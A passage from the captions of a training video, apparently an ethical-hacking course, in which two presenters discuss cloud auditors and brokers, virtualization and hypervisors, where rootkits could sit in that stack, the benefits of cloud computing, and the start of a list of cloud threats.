Price Waterhouse Coopers\nof the world, the biggies.\n\n136\n00:06:21.760 --> 00:06:24.373\nThe big auditing entities,\nand maybe smaller ones.\n\n137\n00:06:24.373 --> 00:06:27.158\nYou don't have to work for\na big auditing firm, big accounting and\n\n138\n00:06:27.158 --> 00:06:29.112\nservices firm to be able\nto do cloud auditing.\n\n139\n00:06:29.112 --> 00:06:31.740\nBut you have to be an independent\nimpartial third party.\n\n140\n00:06:31.740 --> 00:06:35.851\nThat can come in and assess cloud\ncontrols on behalf of the customer and\n\n141\n00:06:35.851 --> 00:06:37.952\nor on behalf of the cloud provider.\n\n142\n00:06:37.952 --> 00:06:39.034\nIt's very important,\n\n143\n00:06:39.034 --> 00:06:42.180\nbecause cloud providers have to have\naudits done on a regular basis.\n\n144\n00:06:42.180 --> 00:06:45.776\nTo provide regulatory compliance and\nattestation for\n\n145\n00:06:45.776 --> 00:06:50.680\ntheir customers to show that they\nare doing the things they should do.\n\n146\n00:06:50.680 --> 00:06:53.994\nFor instance, SOC reporting,\nSOC 1, SOC 2 or type SOC 1.\n\n147\n00:06:53.994 --> 00:07:01.019\nSOC 1 type reporting SOC 2 and or\nSOC 3 is a cloud auditing driven function.\n\n148\n00:07:01.019 --> 00:07:05.280\nWhere the auditor comes in, goes through\nand does a financial services audit for\n\n149\n00:07:05.280 --> 00:07:06.416\nthe cloud provider.\n\n150\n00:07:06.416 --> 00:07:11.147\nAnd then provides letters of attestation\nabout the findings in a SOC report of\n\n151\n00:07:11.147 --> 00:07:12.010\nsome kind.\n\n152\n00:07:12.010 --> 00:07:14.270\nSo, wanna make sure we're\nthinking about that.\n\n153\n00:07:14.270 --> 00:07:17.550\nWe also have ISO standards so\nwe can align with them.\n\n154\n00:07:17.550 --> 00:07:21.210\nThe cloud auditors may be called\nin to verify the integrity of and\n\n155\n00:07:21.210 --> 00:07:23.570\nthe application of those controls.\n\n156\n00:07:23.570 --> 00:07:28.010\nCloud broker is gonna be some sort\nof an entity, a third party group.\n\n157\n00:07:28.010 --> 00:07:30.150\nThat is gonna manage cloud services and\n\n158\n00:07:30.150 --> 00:07:33.810\nessentially maintain relationships\nbetween providers and customers.\n\n159\n00:07:33.810 --> 00:07:38.730\nA lot of times we can buy directly from\nthe real biggies, so Amazon, Microsoft,\n\n160\n00:07:38.730 --> 00:07:39.880\nyou go direct to them.\n\n161\n00:07:39.880 --> 00:07:43.209\nBut you may also buy through a reseller,\nsomebody who's authorized,\n\n162\n00:07:43.209 --> 00:07:46.484\nessentially, to be able to sell their\nservices on behalf of them, and\n\n163\n00:07:46.484 --> 00:07:47.998\nthat's what a Cloud broker is.\n\n164\n00:07:47.998 --> 00:07:49.720\nIt's the third party that brokers,\n\n165\n00:07:49.720 --> 00:07:53.004\nthat literally has the conversation\nbetween customer and provider.\n\n166\n00:07:53.004 --> 00:07:57.191\nAnd says, here's what I can offer you,\nand I can resell this or give you that.\n\n167\n00:07:57.191 --> 00:08:01.759\nSo If you're thinking about hardware for\ninstance, maybe it's CDW, right?\n\n168\n00:08:01.759 --> 00:08:03.128\nThat's gonna broker and\n\n169\n00:08:03.128 --> 00:08:05.290\nsell out of that hardware today,\n>> Mm-hm.\n\n170\n00:08:05.290 --> 00:08:08.640\n>> And the IT space for Dell and\nfor all these other companies, but\n\n171\n00:08:08.640 --> 00:08:10.445\nyou go direct to Dell as well, right?\n\n172\n00:08:10.445 --> 00:08:12.355\n>> Mm-hm.\nOr direct to Cisco and buy from them.\n\n173\n00:08:12.355 --> 00:08:14.945\nOr you buy through their channels,\nthrough one of their authorized resellers.\n\n174\n00:08:14.945 --> 00:08:17.895\nThe cloud brokers really nothing\nmore than just authorized reseller.\n\n175\n00:08:17.895 --> 00:08:21.075\nSo, we just wanna make sure we\nunderstand the general rules, right.\n\n176\n00:08:21.075 --> 00:08:23.299\nWe wanna make sure we\nunderstand the general rules.\n\n177\n00:08:24.640 --> 00:08:27.260\nHello.\n[LAUGH] You ever do that?\n\n178\n00:08:27.260 --> 00:08:30.040\nYou're looking away and all of\na sudden boom look I'm on the screen.\n\n179\n00:08:30.040 --> 00:08:33.280\nI should actually look at the camera and\ntalk to the people.\n\n180\n00:08:33.280 --> 00:08:37.760\nSo, when you're here at IT Pro TV in\nthe studios and we put up the screen or\n\n181\n00:08:37.760 --> 00:08:38.910\nwhatever Actually Mike.\n\n182\n00:08:38.910 --> 00:08:42.250\nAnd I go sit down, we've got some\nlounge chairs off to the side here,\n\n183\n00:08:42.250 --> 00:08:45.130\nwe go hang out for\na bit get off of our feet.\n\n184\n00:08:45.130 --> 00:08:50.030\nBecause standing up all day on the floor\nhere can be murder on your feet, and so\n\n185\n00:08:50.030 --> 00:08:51.970\nwe go sit down, and\nwe're actually talking to you, but\n\n186\n00:08:51.970 --> 00:08:54.290\nwe're talking to you from the chairs.\n\n187\n00:08:54.290 --> 00:08:58.140\nAnd then of course if our switcher goes\na little too quick and comes back.\n\n188\n00:08:58.140 --> 00:09:00.338\nThen you see me looking off to the side or\nsomething.\n\n189\n00:09:00.338 --> 00:09:02.536\n>> [LAUGH] Jumping at an easy chair,\ntrying to get back.\n\n190\n00:09:02.536 --> 00:09:03.240\n>> Thank you, Megan.\n\n191\n00:09:03.240 --> 00:09:04.860\nWe appreciate that as always.\n\n192\n00:09:04.860 --> 00:09:07.660\nAll right.\nSo, making sure that we're thinking about\n\n193\n00:09:07.660 --> 00:09:10.380\nthose roles and\nmaking sure that we know what they are.\n\n194\n00:09:10.380 --> 00:09:12.730\nVery important for\nyou to be able to understand them.\n\n195\n00:09:12.730 --> 00:09:14.790\nThose, by the way,\nalso come out of the NIST guidance,\n\n196\n00:09:14.790 --> 00:09:16.810\nthe NIST reference on cloud computing.\n\n197\n00:09:16.810 --> 00:09:21.600\nThe architecture for all the roles\nis in the NIST 800-146 document\n\n198\n00:09:21.600 --> 00:09:24.410\nthat I think we mentioned in our last\nepisode if I remember correctly.\n\n199\n00:09:24.410 --> 00:09:26.960\nJust make sure you're familiar\nwith that and obviously, again,\n\n200\n00:09:26.960 --> 00:09:30.180\nthat you have that broader sense of\nwhat we call the cloud ecosystem,\n\n201\n00:09:30.180 --> 00:09:33.050\nall the moving parts and the roles\nthat are gonna be involved there.\n\n202\n00:09:33.050 --> 00:09:35.110\nWe've also been talking\na lot about virtualization,\n\n203\n00:09:35.110 --> 00:09:37.210\nwhy virtualization's so important.\n\n204\n00:09:37.210 --> 00:09:40.824\nIf Mike you may help me out for a second\n[CROSSTALK] you are always willing to step\n\n205\n00:09:40.824 --> 00:09:42.833\nin whenever I ask and\nI do appreciate that.\n\n206\n00:09:42.833 --> 00:09:43.910\n>> [LAUGH]\n>> So,\n\n207\n00:09:43.910 --> 00:09:45.880\nif I ask you to define virtualization.\n\n208\n00:09:45.880 --> 00:09:48.470\nIf we would have a chat and\n\n209\n00:09:48.470 --> 00:09:53.560\nsay how can we make virtualization\nkind of simple and easy to explain.\n\n210\n00:09:53.560 --> 00:09:55.460\nWhat would be some of things\nyou will want to tell me?\n\n211\n00:09:55.460 --> 00:09:57.510\n>> Hm, let me see.\n>> Or, maybe you could show me a picture.\n\n212\n00:09:57.510 --> 00:09:58.650\n>> Yeah, absolutely,\nI could show me a picture.\n\n213\n00:09:58.650 --> 00:10:01.820\n>> What would you tell me what\nwould draw for me on a bar napkin.\n\n214\n00:10:01.820 --> 00:10:04.180\n>> I would draw something like this.\n\n215\n00:10:04.180 --> 00:10:04.680\n>> Awesome.\n\n216\n00:10:05.800 --> 00:10:07.900\nLook.\nOutstanding.\n\n217\n00:10:07.900 --> 00:10:11.590\n>> If I was gonna describe this I would\nsay that I wanna be able to take these\n\n218\n00:10:11.590 --> 00:10:16.550\nphysical resources that I have,\nand virtualize them.\n\n219\n00:10:16.550 --> 00:10:22.160\nMake them available divide them up in a\nway that wouldn't be possible physically.\n\n220\n00:10:22.160 --> 00:10:26.440\nLike I can't take that CPU and\ncut it into four little pieces but\n\n221\n00:10:26.440 --> 00:10:32.160\nI can virtualize it give multiple, say\nvirtual PCs, a little piece of that CPU.\n\n222\n00:10:32.160 --> 00:10:35.920\n>> Okay so the physical resources\nspecifically what you were talking about\n\n223\n00:10:35.920 --> 00:10:36.900\n>> Just so we're clear,\n\n224\n00:10:36.900 --> 00:10:39.150\nare the things below and\nthe physical hardware.\n\n225\n00:10:39.150 --> 00:10:40.080\n>> Correct.\n\n226\n00:10:40.080 --> 00:10:43.650\n>> So we've got the CPU, not the rectangle\nthat just popped up at the right-hand\n\n227\n00:10:43.650 --> 00:10:46.100\nside of the screen, but\nall of that's on the diagram.\n\n228\n00:10:46.100 --> 00:10:50.910\nSo we have the CPU and the RAM which\nis what I called, in previous episodes,\n\n229\n00:10:50.910 --> 00:10:52.710\nthe compute resources traditionally.\n\n230\n00:10:52.710 --> 00:10:53.660\nAnd then we have our storage,\n\n231\n00:10:53.660 --> 00:10:56.000\nand then we have our network\nwhich is bandwidth, right?\n\n232\n00:10:56.000 --> 00:10:58.100\nSo access to the four resource groups,\ngreat.\n\n233\n00:10:58.100 --> 00:11:01.400\nAnd then we've got this thing in the\nmiddle there that's labeled Hypervisor.\n\n234\n00:11:01.400 --> 00:11:05.460\nSo that's gonna do our\nabstraction to your definition.\n\n235\n00:11:05.460 --> 00:11:08.970\nIt's gonna carve up that CPU and\nlet us share it, as you were saying,\n\n236\n00:11:08.970 --> 00:11:12.930\ninto four little pieces or\ndifferent areas of different needs.\n\n237\n00:11:12.930 --> 00:11:14.270\nAnd then what do we have up top there?\n\n238\n00:11:14.270 --> 00:11:15.250\nWhat are running up top?\n\n239\n00:11:15.250 --> 00:11:16.230\nOr what is running up top, rather.\n\n240\n00:11:16.230 --> 00:11:16.960\n>> These would be your,\n\n241\n00:11:16.960 --> 00:11:20.600\nwhat we would call your virtual machines\nthat your guest operating systems.\n\n242\n00:11:20.600 --> 00:11:24.270\nI've got one that has\nWindows OS maybe running on it.\n\n243\n00:11:24.270 --> 00:11:28.630\nAnd then applications running on\nit independent of this LinuxOS,\n\n244\n00:11:28.630 --> 00:11:32.780\nso a different guest operating\nsystem is on tile over here\n\n245\n00:11:32.780 --> 00:11:34.200\nwith applications running on it.\n\n246\n00:11:34.200 --> 00:11:38.490\nAll right very cool so\nwe can use that picture in that discussion\n\n247\n00:11:38.490 --> 00:11:40.920\nto help us really define and\nunderstand virtualization.\n\n248\n00:11:40.920 --> 00:11:42.160\nI think that's great actually.\n\n249\n00:11:42.160 --> 00:11:45.730\nLove the color charts.\n\n250\n00:11:45.730 --> 00:11:46.489\n>> Yeah, yeah.\n>> [CROSSTALK]\n\n251\n00:11:46.489 --> 00:11:47.578\n>> Okay, all right.\n\n252\n00:11:47.578 --> 00:11:49.643\n>> [CROSSTALK]\n>> Is the new black.\n\n253\n00:11:49.643 --> 00:11:50.900\n>> Yes.\n[LAUGH]\n\n254\n00:11:50.900 --> 00:11:51.570\n>> So yes.\n\n255\n00:11:51.570 --> 00:11:52.820\nI like that a lot.\n\n256\n00:11:52.820 --> 00:11:54.160\n>> All right, so very good.\n\n257\n00:11:54.160 --> 00:11:56.840\nSo when we go though something like that,\nright?\n\n258\n00:11:56.840 --> 00:11:59.720\nWhat we're looking at ultimately\nis just a way to distill down,\n\n259\n00:11:59.720 --> 00:12:03.260\nand really from the barebones perspective,\ngive you a definition,\n\n260\n00:12:03.260 --> 00:12:06.280\na working thought process\naround virtualization.\n\n261\n00:12:06.280 --> 00:12:10.660\nResources that are in one or more physical\nhosts abstracted through the hyperviser.\n\n262\n00:12:10.660 --> 00:12:14.210\nAs Mike said, chopped up and\nmade available on demand, right?\n\n263\n00:12:14.210 --> 00:12:17.580\nAnd then one or more guest operating\nsystems, the VMs as Mike called them,\n\n264\n00:12:17.580 --> 00:12:20.910\nrunning up top that consume\nthose resources from the host.\n\n265\n00:12:20.910 --> 00:12:25.840\nAnd in that thought process what we have\ngoing on is the provisioning of resources\n\n266\n00:12:25.840 --> 00:12:29.940\nto the guest operating systems through\nthe hypervisor, that is the secret.\n\n267\n00:12:29.940 --> 00:12:33.550\nThat is the definition of virtualization\nand that's what we wanna understand and\n\n268\n00:12:33.550 --> 00:12:36.480\ncarry forward into our\nconversations in the cloud.\n\n269\n00:12:36.480 --> 00:12:39.960\nBecause it's that process\nthat we have to defend and\n\n270\n00:12:39.960 --> 00:12:44.550\nwe have to monitor, as ethical hackers,\nto ensure it's not compromised in any way.\n\n271\n00:12:44.550 --> 00:12:48.030\nI talked about the insertion\npotentially of a root kit at\n\n272\n00:12:48.030 --> 00:12:51.781\nthe level in our last conversation\nin the prior episode.\n\n273\n00:12:51.781 --> 00:12:53.040\nThat could be a problem.\n\n274\n00:12:53.040 --> 00:12:55.740\nWe also could have root kits\nbeing inserted on one or\n\n275\n00:12:55.740 --> 00:12:58.360\nmore virtual machines at the application.\n\n276\n00:12:58.360 --> 00:13:00.330\nOr at the OS level, right?\n\n277\n00:13:00.330 --> 00:13:05.190\nSo there's multiple places there where we\ncould potentially see rootkits emerging.\n\n278\n00:13:05.190 --> 00:13:09.190\nWe could see them in the hardware stack\ndown at the bottom in the physical\n\n279\n00:13:09.190 --> 00:13:14.165\nhardware layer below the actual\nHypervisor, because the host itself\n\n280\n00:13:14.165 --> 00:13:18.885\ncould be routed with a rootkit that\nattacks the operating system of the host.\n\n281\n00:13:18.885 --> 00:13:21.710\nAnd we could see it in\nthe firmware of the host, right.\n\n282\n00:13:21.710 --> 00:13:23.685\n>> Mm-hm.\n>> Our virtual machines don't really have\n\n283\n00:13:23.685 --> 00:13:26.975\nfirmware in the same way we think\nabout physical machines having them.\n\n284\n00:13:26.975 --> 00:13:29.245\nThey have a bias, they are in theory, but\n\n285\n00:13:29.245 --> 00:13:30.668\nit's our config file that says-\n\n286\n00:13:30.668 --> 00:13:31.543\n>> [INAUDIBLE]\n>> This is what you do.\n\n287\n00:13:31.543 --> 00:13:32.645\n>> [LAUGH]\n>> It's not something,\n\n288\n00:13:32.645 --> 00:13:36.000\nthat a rootkit could infect,\nbecause it just doesn't work that way.\n\n289\n00:13:36.000 --> 00:13:38.730\nIf you go to infect a virtual\nmachine you essentially\n\n290\n00:13:38.730 --> 00:13:43.150\nare targeting either the hypervisor or\nthe guest operating system.\n\n291\n00:13:43.150 --> 00:13:46.680\nBut, you can't really get at the physical\nhardware, physical hardware's on the host\n\n292\n00:13:46.680 --> 00:13:49.800\nso you attack the host to\nattack that portion of it.\n\n293\n00:13:49.800 --> 00:13:52.640\nBut, there's about three or\nfour different places where rootkits could\n\n294\n00:13:52.640 --> 00:13:54.830\npotentially come in,\nin that diagram right?\n\n295\n00:13:54.830 --> 00:13:56.210\nAnd could potentially be an issue.\n\n296\n00:13:56.210 --> 00:13:58.160\nSo we do want to understand that and\n\n297\n00:13:58.160 --> 00:14:01.680\nunderstand that as ethical hackers we\nhave to take the next step there right?\n\n298\n00:14:01.680 --> 00:14:05.560\nWe have to be proactive and\nwe have to monitoring all those areas.\n\n299\n00:14:05.560 --> 00:14:09.415\nCuz as we look at cloud computing\nthreats there are many of them of them.\n\n300\n00:14:09.415 --> 00:14:11.365\nI'm focusing just in one area right now.\n\n301\n00:14:11.365 --> 00:14:15.475\nBut we're going to broaden that\nconversation and talk about a lot more of\n\n302\n00:14:15.475 --> 00:14:18.265\nthese, but let's first talk quickly about\nsome of the benefits of Cloud computing.\n\n303\n00:14:18.265 --> 00:14:21.365\nBecause it's never good to talk about all\nthe bad without sprinkling a little bit of\n\n304\n00:14:21.365 --> 00:14:23.850\ngood in there Just to make it sound\na little better than it really is.\n\n305\n00:14:23.850 --> 00:14:26.130\nRight?\nSo, for instance.\n\n306\n00:14:26.130 --> 00:14:28.490\nWhat are some of the key benefits for\nthe Guards Cloud computer?\n\n307\n00:14:28.490 --> 00:14:30.830\nWhat would you say would be on\nyour top two or three lists?\n\n308\n00:14:30.830 --> 00:14:33.550\nIf I said, hey I'm gonna do\nthis cloud computing thing and\n\n309\n00:14:33.550 --> 00:14:35.060\nI'm not sure that I like it.\n\n310\n00:14:35.060 --> 00:14:37.520\nI'm not sure it's gonna be good\ngive me a compelling reason or\n\n311\n00:14:37.520 --> 00:14:38.820\ntwo why you think it would be valuable.\n\n312\n00:14:38.820 --> 00:14:41.480\nMike said I value your\nopinion as you always do.\n\n313\n00:14:41.480 --> 00:14:43.780\nSo what would you tell me?\n\n314\n00:14:43.780 --> 00:14:47.530\n>> The first thing I would say is\nthat my server closet, there is so\n\n315\n00:14:47.530 --> 00:14:50.080\nmuch less power consumption\ngoing on there.\n\n316\n00:14:50.080 --> 00:14:53.100\nLess physical servers in my\nthat I have to worry about.\n\n317\n00:14:53.100 --> 00:14:56.190\nTypically if we're talking\nabout platform or even higher,\n\n318\n00:14:57.540 --> 00:15:02.690\nI'd have to worry about patching operating\nsystems and updates and things like that.\n\n319\n00:15:02.690 --> 00:15:06.340\nSo huge benefit from going\nto the cloud for that.\n\n320\n00:15:06.340 --> 00:15:08.970\n>> All right so when we're thinking about,\nas Mike was saying, either platform as\n\n321\n00:15:08.970 --> 00:15:13.480\na service or when he said either he means\nplatform or software going up the scale.\n\n322\n00:15:13.480 --> 00:15:18.050\nSo platform or SASS, patch management,\nsecurity, application updates,\n\n323\n00:15:18.050 --> 00:15:21.070\nrevision control all that's\ngoing to the cloud provider.\n\n324\n00:15:21.070 --> 00:15:25.700\nI'm paying my monthly fee and\nI'm essentially commoditizing that and\n\n325\n00:15:25.700 --> 00:15:28.770\nsaying for 20 bucks a month,\nI don't have a headache anymore, right?\n\n326\n00:15:28.770 --> 00:15:29.990\n>> I don't have to upgrade equipment.\n\n327\n00:15:29.990 --> 00:15:30.750\n>> Right.\n>> I don't have to buy\n\n328\n00:15:30.750 --> 00:15:31.990\nnew stuff as it comes out.\n\n329\n00:15:31.990 --> 00:15:33.660\nThey're gonna make sure I\nhave the latest and greatest.\n\n330\n00:15:33.660 --> 00:15:34.380\n>> Okay.\nSo I don't have to worry\n\n331\n00:15:34.380 --> 00:15:34.950\nabout any of that.\n\n332\n00:15:34.950 --> 00:15:36.000\nSo that's all great.\n\n333\n00:15:36.000 --> 00:15:36.550\nRight?\nSo,\n\n334\n00:15:36.550 --> 00:15:38.160\nthere's definitely economy of scale there.\n\n335\n00:15:38.160 --> 00:15:40.190\nWe know it's quickly scalable,\nit's elastic.\n\n336\n00:15:40.190 --> 00:15:43.302\nWe know that we can, not get rid of,\nbut we can transfer some\n\n337\n00:15:43.302 --> 00:15:47.165\nof those security concerns to a provider\nthat through economy of scale and\n\n338\n00:15:47.165 --> 00:15:51.048\njust sheer volume is probably going\nto focus on them through automation.\n\n339\n00:15:51.048 --> 00:15:54.627\nAnd therefore, most likely, make them\na lot easier to manage for us, and\n\n340\n00:15:54.627 --> 00:15:56.439\nby extension, for everybody else.\n\n341\n00:15:56.439 --> 00:15:57.889\nSo, that's gonna be good.\n\n342\n00:15:57.889 --> 00:16:00.418\nWe also want to think\nabout monetary savings.\n\n343\n00:16:00.418 --> 00:16:02.800\nYou mentioned, hey I'm not\ngonna have as much stuff to do.\n\n344\n00:16:02.800 --> 00:16:04.890\nBut also as much stuff to own and\n\n345\n00:16:04.890 --> 00:16:07.820\nas a result I'm gonna get\nback value on both sides.\n\n346\n00:16:07.820 --> 00:16:11.010\nI can take some of Mike's time and\nhave it reapply it to other stuff.\n\n347\n00:16:11.010 --> 00:16:14.490\nMike could potentially go off and learn\nhow to do other things or manage other\n\n348\n00:16:14.490 --> 00:16:18.890\ninfrastructure, and we're also not\ngonna spend as much money potentially.\n\n349\n00:16:18.890 --> 00:16:21.895\nIn both power as well as licensing and\n\n350\n00:16:21.895 --> 00:16:24.940\ninfrastructure, all the stuff\nthat goes into that.\n\n351\n00:16:24.940 --> 00:16:25.525\nWhat about DR?\n\n352\n00:16:25.525 --> 00:16:28.710\nWill cloud related technologies\nmake disaster recovery a little bit\n\n353\n00:16:28.710 --> 00:16:29.650\neasier to manage?\n\n354\n00:16:29.650 --> 00:16:30.370\n>> I think so.\n\n355\n00:16:30.370 --> 00:16:32.810\n>> Potentially, it could, it may.\n\n356\n00:16:32.810 --> 00:16:36.470\nThe reality is that machines become\nhighly portable in the cloud.\n\n357\n00:16:36.470 --> 00:16:40.500\nVirtual machines could be moved relatively\nquickly through live migration or\n\n358\n00:16:40.500 --> 00:16:45.340\nvirtual motion technologies, to be able\nto move between hosts during periods of\n\n359\n00:16:45.340 --> 00:16:48.280\neither stress, failure,\nor unbalanced load.\n\n360\n00:16:48.280 --> 00:16:52.880\nSo distributed resource, or\nsoftware based load balancing\n\n361\n00:16:52.880 --> 00:16:57.950\nresource management through clusters is\ngonna help us to optimize consumption.\n\n362\n00:16:57.950 --> 00:17:02.230\nAlso we are able to if we have let's say,\n\n363\n00:17:02.230 --> 00:17:06.240\na highly available versus a fault tolerant\nsystem, we're able to worry about\n\n364\n00:17:06.240 --> 00:17:10.580\nhow machines will be managed during\nfailure, either expected or unexpected.\n\n365\n00:17:10.580 --> 00:17:14.990\nSo if we go into a maintenance mode\nscenario to do work on the host, we could\n\n366\n00:17:14.990 --> 00:17:19.460\ncontrol the migration over to other\nsystems to allow the VM's to stay up.\n\n367\n00:17:19.460 --> 00:17:22.310\nOr if we have a failure,\nwe could bring up,\n\n368\n00:17:22.310 --> 00:17:25.910\nin a highly available system with\nminimal downtime, a restart can be\n\n369\n00:17:25.910 --> 00:17:29.390\ndone automatically or a default tolerant\nsystem, we have a mirrored VM running in\n\n370\n00:17:29.390 --> 00:17:33.480\nreal time in two places, if we lose one\nwe're connect to both at the same time.\n\n371\n00:17:33.480 --> 00:17:35.780\nSo we have zero down time potentially.\n\n372\n00:17:35.780 --> 00:17:37.310\n>> At the physical level, their hardware,\n\n373\n00:17:37.310 --> 00:17:40.650\nthey're providing that redundancy\nbecause they've got an SLA with me,\n\n374\n00:17:40.650 --> 00:17:43.330\nso I'm pretty sure that they're\ngonna have that taken care of.\n\n375\n00:17:43.330 --> 00:17:45.850\n>> They being the cloud provider, correct?\n\n376\n00:17:45.850 --> 00:17:46.920\n>> Yeah, the cloud service provider.\n\n377\n00:17:46.920 --> 00:17:50.163\nA lot of these providers allow\nyou to split your data up or\n\n378\n00:17:50.163 --> 00:17:54.859\nkeep copies of data in different data\ncenters in different geographical areas.\n\n379\n00:17:54.859 --> 00:17:56.434\n>> So you're talking about bit splitting?\n\n380\n00:17:56.434 --> 00:17:57.014\n>> Yes.\n\n381\n00:17:57.014 --> 00:18:00.514\n>> Which is a cloud-based technology for\nessentially, creating a DFS-like,\n\n382\n00:18:00.514 --> 00:18:03.380\nif you're familiar with the DFS\non the Windows platform.\n\n383\n00:18:03.380 --> 00:18:06.510\nA distributed file system\nfunctionality where we've got multiple\n\n384\n00:18:06.510 --> 00:18:08.830\npieces that are stored in different areas.\n\n385\n00:18:08.830 --> 00:18:10.720\nNow bit splitting is a little different,\nyou're right.\n\n386\n00:18:10.720 --> 00:18:12.920\nBut bit splitting's a little bit\ndifferent in the sense that,\n\n387\n00:18:12.920 --> 00:18:16.020\nwe're not accessing the data\nfrom multiple places\n\n388\n00:18:16.020 --> 00:18:19.140\nin a mirrored fashion where it's\nalways the same the way DFS would be.\n\n389\n00:18:19.140 --> 00:18:23.220\nBut rather we're storing chunks in\ndifferent places to get around some of\n\n390\n00:18:23.220 --> 00:18:26.460\nthe concerns with having it all in one\nbasket from a failure perspective, but\n\n391\n00:18:26.460 --> 00:18:30.480\nalso from a legal and a jurisdictional\nperspective, we may want our data\n\n392\n00:18:30.480 --> 00:18:33.510\nin different places so that it's not\neasy for somebody to come take it.\n\n393\n00:18:33.510 --> 00:18:36.480\nAnd as a result we can safeguard\nit by pulling it all back\n\n394\n00:18:36.480 --> 00:18:37.550\ntogether when we need it.\n\n395\n00:18:37.550 --> 00:18:39.950\nSo bit splitting is roughly what\nyou're describing in the cloud,\n\n396\n00:18:39.950 --> 00:18:43.290\nbut it's a little bit different\nto what I described in DFS.\n\n397\n00:18:43.290 --> 00:18:45.730\nJust understand that the analysis or\n\n398\n00:18:45.730 --> 00:18:50.811\nessentially the, I can't think of\nthe English word, I'm thinking of.\n\n399\n00:18:50.811 --> 00:18:53.490\nThe comparison or\nthe analogy is what I'm thinking of, but\n\n400\n00:18:53.490 --> 00:18:56.140\nthe analogy is 90% accurate.\n\n401\n00:18:56.140 --> 00:18:59.930\nBut DFS, which was my thing\nthat I threw into the ring,\n\n402\n00:18:59.930 --> 00:19:01.550\nis not quite the same as bit splitting.\n\n403\n00:19:01.550 --> 00:19:03.083\nThere is a subtle bit of\nimportant difference there.\n\n404\n00:19:03.083 --> 00:19:03.825\nBut, you're right,\n\n405\n00:19:03.825 --> 00:19:06.265\nbeing able to spread that data out's\ngonna be very important as well.\n\n406\n00:19:06.265 --> 00:19:09.215\n>> And I would think one of the last\nbig selling points that I would wanna\n\n407\n00:19:09.215 --> 00:19:11.715\nmention would be the fact that I\ncould get to it from anywhere.\n\n408\n00:19:11.715 --> 00:19:16.120\nThe ability for any of my users, no\nmatter where they are, hotel, home, work.\n\n409\n00:19:16.120 --> 00:19:17.490\n>> Are you using our word of the day?\n\n410\n00:19:17.490 --> 00:19:18.940\nWhich is, what?\n\n411\n00:19:18.940 --> 00:19:19.880\n>> Ubiquitous.\n\n412\n00:19:19.880 --> 00:19:22.420\n>> It is ubiquitous,\nit is available from anywhere.\n\n413\n00:19:22.420 --> 00:19:23.670\nWe have the winner.\n\n414\n00:19:23.670 --> 00:19:24.680\nDing ding.\n\n415\n00:19:24.680 --> 00:19:27.990\nI win the batman socks\ncuz I identified it.\n\n416\n00:19:27.990 --> 00:19:30.450\nSo word of the day,\nubiquitousness, absolutely.\n\n417\n00:19:30.450 --> 00:19:32.140\nSo, the cloud is ubiquitous.\n\n418\n00:19:32.140 --> 00:19:35.200\nIt is available from anywhere so we can\nget to our data, get to all that stuff.\n\n419\n00:19:35.200 --> 00:19:37.830\nAll of these are gonna be\nbenefits of cloud computing.\n\n420\n00:19:37.830 --> 00:19:40.080\nYou should know some of be\nbenefits of cloud computing,\n\n421\n00:19:40.080 --> 00:19:42.370\nit would be very important for\nyou to think about those.\n\n422\n00:19:42.370 --> 00:19:45.162\nBut aside from benefits, and\nwe know benefits are always good but\n\n423\n00:19:45.162 --> 00:19:48.540\nwith good comes potential liability,\ncomes some risk, some concern.\n\n424\n00:19:48.540 --> 00:19:51.760\nSo let's talk about threats\nassociated with cloud computing.\n\n425\n00:19:51.760 --> 00:19:53.330\nSo let's think about\nsome of the top threats.\n\n426\n00:19:53.330 --> 00:19:55.470\nSo same conversation, Mike,\nbut let's turn it around.\n\n427\n00:19:55.470 --> 00:19:58.780\nDid a great job of helping me identify the\nbenefits, what if we have to identify some\n\n428\n00:19:58.780 --> 00:20:01.680\nof the risks, some of the threats,\nsome of the concerns with cloud computing.\n\n429\n00:20:01.680 --> 00:20:02.830\nWhat would be on that list?\n\n430\n00:20:02.830 --> 00:20:04.740\n>> Well, we can probably work\nour way back down that list.\n\n431\n00:20:04.740 --> 00:20:07.360\nThe fact that it was ubiquitous,\nit's available everywhere.\n\n432\n00:20:07.360 --> 00:20:12.250\nThat also means that the bad actors can\nget to it from anywhere, potentially.\n\n433\n00:20:12.250 --> 00:20:15.550\n>> Okay, so if it's available to us,\nit could also be the bad guys.\n\n434\n00:20:15.550 --> 00:20:17.900\n>> Right, they don't have to\nfind my physical location and\n\n435\n00:20:17.900 --> 00:20:19.900\ntry to get into my\nnetwork in that respect.\n\n436\n00:20:19.900 --> 00:20:22.760\n>> Okay, so\nwe have to be on guard not just on one or\n\n437\n00:20:22.760 --> 00:20:27.300\ntwo areas, but essentially we have\nto be on guard for lots of people.\n\n438\n00:20:27.300 --> 00:20:30.525\nBoth people we know and people we don't,\npotentially trying to gain access.\n\n439\n00:20:30.525 --> 00:20:34.335\nBecause those entry points,\nwhile they may be well-defined, and\n\n440\n00:20:34.335 --> 00:20:38.815\nwe can put border defenses in place,\nmonitors like firewalls, IDSs,\n\n441\n00:20:38.815 --> 00:20:41.940\nIPSs, gateway systems like routers,\n\n442\n00:20:41.940 --> 00:20:46.560\nthings of that nature that can have access\ncontrol lists and scanning capabilities.\n\n443\n00:20:46.560 --> 00:20:51.410\nAnd DLP, data loss prevention technology\nto reach into packet streams and\n\n444\n00:20:51.410 --> 00:20:55.428\ntake data out and replace data and\nprevent it from being used.\n\n445\n00:20:55.428 --> 00:21:00.020\nUn-encrypting and re-encrypting on the fly\nto look at data streams and flows.\n\n446\n00:21:00.020 --> 00:21:03.160\nWe've talked a lot about these\ntechnologies in prior episodes and some of\n\n447\n00:21:03.160 --> 00:21:07.240\nthe various ways we can use this to our\nadvantage as hackers and as a result,\n\n448\n00:21:07.240 --> 00:21:11.084\nas ethical hackers, know that we have to\nbe on the guard I'm a look out for this.\n\n449\n00:21:11.084 --> 00:21:14.780\nWe've talked about that and that's very\nimportant because we could stand watch on\n\n450\n00:21:14.780 --> 00:21:20.020\nthe border, but the fact that in theory\nanybody in the world can come in\n\n451\n00:21:20.020 --> 00:21:24.250\nto that entry point makes a lot more\ndifficult for us to spot a good actors\n\n452\n00:21:24.250 --> 00:21:27.070\nfrom the bad actors, or be able to\ntell the difference between the two.\n\n453\n00:21:27.070 --> 00:21:28.930\nAbsolutely, so\nthat's definitely one of the ones.\n\n454\n00:21:28.930 --> 00:21:30.260\nWhat else may be on that list?\n\n455\n00:21:30.260 --> 00:21:31.790\n>> Next thing I'm gonna think about or\n\n456\n00:21:31.790 --> 00:21:37.340\nconcern with is the fact that I'm most\nlikely sharing as a multi tenant provider.\n\n457\n00:21:37.340 --> 00:21:40.780\nThese cloud service providers are not just\nthere for me, there's other customers.\n\n458\n00:21:40.780 --> 